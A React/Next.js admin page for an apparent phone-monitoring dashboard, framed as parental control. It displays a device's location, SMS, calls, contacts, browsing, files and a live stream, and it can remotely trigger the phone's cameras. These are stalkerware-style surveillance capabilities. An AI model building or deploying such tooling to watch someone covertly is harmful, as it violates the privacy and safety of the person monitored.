// app/admin/devices/[id]/page.tsx
"use client";

import React, { useEffect, useState, useCallback } from "react";
import { useParams } from "next/navigation";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage } from "@/lib/device-types";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceMapTracker } from "@/components/admin/devices/DeviceMapTracker";
import { DeviceCameraGallery } from "@/components/admin/devices/DeviceCameraGallery";
import { DeviceContactsTable } from "@/components/admin/devices/DeviceContactsTable";
import { DeviceCallLogsList } from "@/components/admin/devices/DeviceCallLogsList";
import { DeviceMessagesFeed } from "@/components/admin/devices/DeviceMessagesFeed";
import { DeviceAppsTab } from "@/components/admin/devices/DeviceAppsTab";
import { DeviceBrowsingTab } from "@/components/admin/devices/DeviceBrowsingTab";
import { DeviceFilesTab } from "@/components/admin/devices/DeviceFilesTab";
import { DeviceLiveStreamTab } from "@/components/admin/devices/DeviceLiveStreamTab";
import { MapPin, Camera, User, Phone, MessageSquare, Radio, Layers, Globe, Folder } from "lucide-react";

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const [device, setDevice] = useState<MonitoredDevice | null>(null);
  const [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [captures, setCaptures] = useState<any[]>([]);
  const [activeTab, setActiveTab] = useState<
    "map" | "stream" | "camera" | "apps" | "browsing" | "files" | "contacts" | "calls" | "messages"
  >("map");
  const [loading, setLoading] = useState(true);

  const fetchDeviceData = useCallback(async () => {
    if (!deviceId) return;
    try {
      const [devRes, locRes, conRes, callRes, msgRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}`).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=50`).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=contacts&limit=200`).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=calls&limit=100`).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=messages&limit=100`).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands`).then((r) => r.json()),
      ]);

      if (devRes.device) setDevice(devRes.device);
      if (locRes.locations) setLocations(locRes.locations);
      if (conRes.contacts) setContacts(conRes.contacts);
      if (callRes.calls) setCalls(callRes.calls);
      if (msgRes.messages) setMessages(msgRes.messages);
      if (cmdRes.commands) {
        const photoCommands = cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path);
        setCaptures(photoCommands);
      }
    } catch (err) {
      console.error("Error loading device telemetry", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  useEffect(() => {
    fetchDeviceData();
    const interval = setInterval(fetchDeviceData, 10000);
    return () => clearInterval(interval);
  }, [fetchDeviceData]);

  const handleTriggerSnap = async (camera: "front" | "back") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "take_photo", payload: { camera } }),
    });
    alert(`📸 ${camera === "front" ? "Front" : "Back"} camera snap command sent to child's phone!`);
    fetchDeviceData();
  };

  if (loading && !device) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" />
      </div>
    );
  }

  if (!device) {
    return <div className="p-8 text-center text-slate-500 dark:text-white/50">Device not found</div>;
  }

  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Stream 🔴", icon: Radio },
    { id: "apps", label: "App Usage", icon: Layers },
    { id: "browsing", label: "Browsing", icon: Globe },
    { id: "files", label: "Gallery & Files", icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "contacts", label: `Contacts (${contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      <DeviceDetailHeader device={device} onRefresh={fetchDeviceData} />

      {/* Tabs */}
      <div className="flex items-center gap-1.5 p-1 rounded-2xl bg-slate-100 dark:bg-white/[0.03] border border-slate-200 dark:border-white/10 overflow-x-auto select-none">
        {TABS.map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setActiveTab(id as any)}
            className={`flex items-center gap-2 py-2.5 px-3.5 rounded-xl text-xs font-bold transition-all shrink-0 ${
              activeTab === id
                ? "bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black shadow-md"
                : "text-slate-600 dark:text-white/60 hover:text-slate-900 dark:hover:text-white hover:bg-white/5"
            }`}
          >
            <Icon className="w-3.5 h-3.5" />
            {label}
          </button>
        ))}
      </div>

      {/* Tab Content */}
      <div className="p-5 rounded-3xl bg-white dark:bg-[#0B0B0E] border border-slate-200 dark:border-white/10 shadow-xl transition-colors">
        {activeTab === "map" && <DeviceMapTracker locations={locations} childName={device.child_name} />}
        {activeTab === "stream" && <DeviceLiveStreamTab deviceId={deviceId} childName={device.child_name} />}
        {activeTab === "apps" && <DeviceAppsTab deviceId={deviceId} />}
        {activeTab === "browsing" && <DeviceBrowsingTab deviceId={deviceId} />}
        {activeTab === "files" && <DeviceFilesTab deviceId={deviceId} />}
        {activeTab === "camera" && <DeviceCameraGallery captures={captures} onTriggerSnap={handleTriggerSnap} />}
        {activeTab === "contacts" && <DeviceContactsTable contacts={contacts} />}
        {activeTab === "calls" && <DeviceCallLogsList calls={calls} />}
        {activeTab === "messages" && <DeviceMessagesFeed messages={messages} />}
      </div>
    </div>
  );
}
